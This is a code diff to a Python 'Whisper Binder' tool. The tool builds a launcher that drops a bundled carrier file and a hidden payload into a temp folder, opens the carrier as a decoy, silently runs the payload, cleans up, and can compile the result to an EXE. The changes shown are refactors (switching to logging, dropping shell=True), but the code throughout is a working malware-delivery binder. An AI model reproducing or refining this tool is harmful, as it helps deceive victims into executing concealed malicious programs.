@@ -11,7 +11,9 @@ The output when run:
   2. Opens the carrier file with the default handler
   3. Cleans up after itself
 """
-import os, sys, base64, argparse, subprocess, tempfile, struct
+import os, sys, base64, argparse, subprocess, tempfile, struct, logging
+
+log = logging.getLogger("whisper.binder")
 
 LAUNCHER_SCRIPT = r'''# -*- coding: utf-8 -*-
 import os, sys, base64, tempfile, subprocess, struct, time
@@ -41,8 +43,8 @@ def _main():
         cr_path = os.path.join(tmp, "carrier" + _ext(carrier[:16]))
         with open(pl_path, "wb") as f: f.write(payload)
         with open(cr_path, "wb") as f: f.write(carrier)
-        subprocess.Popen([cr_path], shell=True)
-        subprocess.Popen([pl_path], shell=True)
+        subprocess.Popen([cr_path])
+        subprocess.Popen([pl_path])
         time.sleep(5)
     finally:
         try:
@@ -80,10 +82,10 @@ def bind(carrier_path, payload_path, output_path, compile_exe=True):
         f.write(out)
 
     size = len(out)
-    print(f"[+] Bound file: {output_path}")
-    print(f"[+] Carrier: {os.path.basename(carrier_path)} ({len(carrier)//1024} KB)")
-    print(f"[+] Payload: {os.path.basename(payload_path)} ({len(payload)//1024} KB)")
-    print(f"[+] Total: {size//1024} KB")
+    log.info("Bound file: %s", output_path)
+    log.info("Carrier: %s (%d KB)", os.path.basename(carrier_path), len(carrier)//1024)
+    log.info("Payload: %s (%d KB)", os.path.basename(payload_path), len(payload)//1024)
+    log.info("Total: %d KB", size//1024)
 
     if compile_exe and output_path.endswith(".py"):
         exe_path = output_path.replace(".py", ".exe")
@@ -92,10 +94,10 @@ def bind(carrier_path, payload_path, output_path, compile_exe=True):
                            "--specpath", tempfile.gettempdir(), "--workpath", tempfile.gettempdir(),
                            "-n", os.path.splitext(os.path.basename(exe_path))[0],
                            output_path], check=True, timeout=120)
-            print(f"[+] Compiled to EXE: {exe_path}")
+            log.info("Compiled to EXE: %s", exe_path)
         except Exception as e:
-            print(f"[!] PyInstaller compile failed: {e}")
-            print(f"[!] Run the .py launcher directly")
+            log.error("PyInstaller compile failed: %s", e)
+            log.info("Run the .py launcher directly")
 
 def main():
     parser = argparse.ArgumentParser(description="Whisper Binder")
